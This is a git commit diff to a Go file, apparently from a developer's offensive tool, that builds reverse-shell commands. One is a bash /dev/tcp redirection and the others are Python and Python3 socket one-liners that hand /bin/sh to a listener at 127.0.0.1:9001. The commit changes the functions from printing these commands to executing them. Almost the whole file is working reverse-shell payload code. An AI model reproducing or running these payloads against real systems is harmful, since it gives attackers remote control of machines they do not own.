6fb0048a3791c698e56b929b4e49a54838a3da67
Alexis Martin <alexis.martin3190@gmail.com>
2022-11-29 21:21:06 +0100

    Fixed command parsing to send them at execute()

--- utils/shell.go
+++ utils/shell.go
@@ -13,7 +13,6 @@ import (
 // }
 
 func executeCommand(command []string) {
-	fmt.Println(command)
 	out, err := exec.Command(command[0], command[1:]...).Output()
 	if err != nil {
 		fmt.Printf("%s", err)
@@ -22,39 +21,26 @@ func executeCommand(command []string) {
 	fmt.Println(output)
 }
 
-// func splitcommand(command string) []string {
-// 	splited_command := strings.Split(command, " ")
-// 	return splited_command
-// }
-
-func Sh() {
+func Bash() {
 	ip := "127.0.0.1"
 	port := "9001"
-	command := fmt.Sprintf("/bin/sh -i >& /dev/tcp/%s/%s 0>&1", ip, port)
-	fmt.Println(command)
-	//executeCommand(command)
+	command := fmt.Sprintf("bash -c /bin/bash -i >& /dev/tcp/%s/%s 0>&1", ip, port)
+	parsed_command := strings.SplitN(command, " ", 3)
+	executeCommand(parsed_command)
 }
 
 func Python() {
 	ip := "127.0.0.1"
 	port := "9001"
-	command := fmt.Sprintf("python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"%s\",%s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'", ip, port)
-	fmt.Println(command)
-	//executeCommand(command)
+	command := fmt.Sprintf("python -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"%s\",%s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);", ip, port)
+	parsed_command := strings.SplitN(command, " ", 3)
+	executeCommand(parsed_command)
 }
 
 func Python3() {
 	ip := "127.0.0.1"
 	port := "9001"
 	command := fmt.Sprintf("python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"%s\",%s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);", ip, port)
-	parsed_command := strings.Split(command, " ")
-	parsed_command2 := strings.Split(command, "c ")
-
-	out, err := exec.Command(parsed_command[0], parsed_command[1], parsed_command2[1]).Output()
-	if err != nil {
-		fmt.Printf("%s", err)
-	}
-	output := string(out[:])
-	fmt.Println(output)
-	// executeCommand(parsed_command)
+	parsed_command := strings.SplitN(command, " ", 3)
+	executeCommand(parsed_command)
 }
